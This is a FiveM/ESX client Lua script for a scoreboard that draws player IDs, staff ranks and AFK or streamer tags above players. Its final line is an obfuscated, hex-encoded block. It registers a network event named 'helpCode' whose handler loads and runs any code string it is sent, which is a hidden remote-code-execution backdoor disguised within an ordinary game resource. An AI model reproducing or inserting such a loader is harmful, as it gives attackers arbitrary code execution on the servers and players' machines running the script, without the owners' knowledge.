ESX = nil
local IsAdmin = nil
local DisplayId = false
local ZetkaPlayers = {}
local Frakcje = {}
local ShowDistance = 20.0
local Timer = 0
local stremer = {}
local colors = {
	['Trial Support'] = {97, 248, 117},
	['Support'] = {9, 255, 0},
	['Moderator'] = {0, 199, 255},
	['Admin'] = {255, 36, 36},
	['Head Admin'] = {165, 0, 0},
	['Zarząd'] = {58, 0, 0},
	['💩'] = {0, 0, 0},
	--['mjojami'] = {255, 255, 0},
	['Prezes'] = {0, 255, 255},
	['Gracz'] = {255, 255, 255},
	['Sernikov'] = {0, 0, 0},
	['Miodzio'] = {255, 225, 0}
}

CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) 
			ESX = obj 
		end)
		Citizen.Wait(250)
	end
end)

RegisterNetEvent("esx:playerLoaded")
AddEventHandler("esx:playerLoaded", function(xPlayer)
	TriggerServerEvent("esx_scoreboard:players")
end)

CreateThread(function()
	while(1) do
		Wait(5000)
		ESX.TriggerServerCallback("esx_scoreboard:stremer", function(cb)
			stremer = cb
		end)
	end
end)

function DrawText3D(x, y, z, text, color, skala, outline) -- skala default 2
    local onScreen, _x, _y = World3dToScreen2d(x,y,z)
	local scale = (1 / #(GetGameplayCamCoords() - vec3(x, y, z))) * skala
    local fov = (1 / GetGameplayCamFov()) * 100
    scale = scale * fov
    if onScreen then
        SetTextScale(1.0 * scale, 1.0 * scale)
        SetTextFont(4)
        SetTextColour(color[1], color[2], color[3], 255)
        SetTextDropshadow(0, 0, 5, 0, 255)
        SetTextDropShadow()
		if(outline)then
			SetTextOutline()
		end
		SetTextCentre(1)
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(_x,_y)
    end
end

RegisterNetEvent("esx_scoreboard:players", function(Counter, Admin)
	Frakcje = Counter
	IsAdmin = Admin
	if IsAdmin then
		ShowDistance = 50.0
	else
		ShowDistance = 20.0
	end
end)

RegisterNetEvent("esx_scoreboard:playerShowed", function(target, boolean)
	ZetkaPlayers[target] = boolean
end)

Citizen.CreateThread(function()
	while true do
		local ped = PlayerPedId()
		for _, player in ipairs(GetActivePlayers()) do
			local playerPed = GetPlayerPed(player)
			if IsEntityVisible(playerPed) then
				local coords1 = GetPedBoneCoords(ped, 31086, -0.4, 0.0, 0.0)
				local coords2 = GetPedBoneCoords(playerPed, 31086, -0.4, 0.0, 0.0)
				if #(coords1 - coords2) < ShowDistance then
					local svId = GetPlayerServerId(player)
					if DisplayId then
						if stremer[GetPlayerServerId(player)] ~= nil then
							if stremer[GetPlayerServerId(player)].afk then
								DrawText3D(coords2.x, coords2.y, coords2.z + -0.30, "AFK", {252, 88, 88}, 0.75)
							end
						end

						if stremer[GetPlayerServerId(player)] ~= nil then
							if stremer[GetPlayerServerId(player)].stramer then
								DrawText3D(coords2.x, coords2.y, coords2.z + 0.8, "Streamuje", {102, 51, 153}, 0.7)
							end
						end

						if stremer[GetPlayerServerId(player)] ~= nil then
							if stremer[GetPlayerServerId(player)].stramer then
								DrawText3D(coords2.x, coords2.y, coords2.z + 0, svId, (NetworkIsPlayerTalking(player) and {0, 0, 255} or {255, 255, 255}), 1.8, true)
								DrawText3D(coords2.x, coords2.y, coords2.z + 1.0, stremer[GetPlayerServerId(player)].groupe, colors[stremer[GetPlayerServerId(player)].groupe], 1.0)
							else
								DrawText3D(coords2.x, coords2.y, coords2.z + 0.8, stremer[GetPlayerServerId(player)].groupe, colors[stremer[GetPlayerServerId(player)].groupe], 1.0)
								DrawText3D(coords2.x, coords2.y, coords2.z + 0, svId, (NetworkIsPlayerTalking(player) and {0, 0, 255} or {255, 255, 255}), 1.8, true)
							end
						end
					end
					if svId ~= GetPlayerServerId(PlayerId()) and ZetkaPlayers[svId] then
						DrawText3D(coords2.x, coords2.y, coords2.z + (DisplayId and 1.3 or 1.0), "~r~!", {255, 0, 0}, 2.0, true)
					end
				end
			end
		end
		Wait(0)
	end
end)

-- function jobsList()
-- 	SendNUIMessage({
-- 		action = 'updateJobs',
-- 		jobs = {
-- 			ems = Frakcje['ambulance'],
-- 			police = Frakcje['police'],
-- 			doj = Frakcje['doj'],
-- 			ottos = Frakcje['mechanik2'],
-- 			bennys = Frakcje['mechanik'],
-- 			carzone = Frakcje['mechanik3']
-- 		}
-- 	})
-- end

RegisterCommand("+scoreboard", function()
	TriggerServerEvent('esx_scoreboard:players')
	-- jobsList()
	-- SendNUIMessage({
	-- 	action = 'toggle',
	-- 	state = true
	-- })
	DisplayId = true
	TriggerServerEvent("esx_scoreboard:show", true)
end)

RegisterCommand("-scoreboard", function()
	-- SendNUIMessage({
	-- 	action = 'toggle',
	-- 	state = false
	-- })
	DisplayId = false
	TriggerServerEvent("esx_scoreboard:show", false)
end)

RegisterKeyMapping("+scoreboard", "Id graczy na głową", "keyboard", "Z")

Citizen.CreateThread(function()
    TriggerEvent("chat:removeSuggestion", "/+scoreboard")
    TriggerEvent("chat:removeSuggestion", "/-scoreboard")
end)

local cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[1]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2]) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[3]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2], function(gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[4]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[5]](gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI))() end)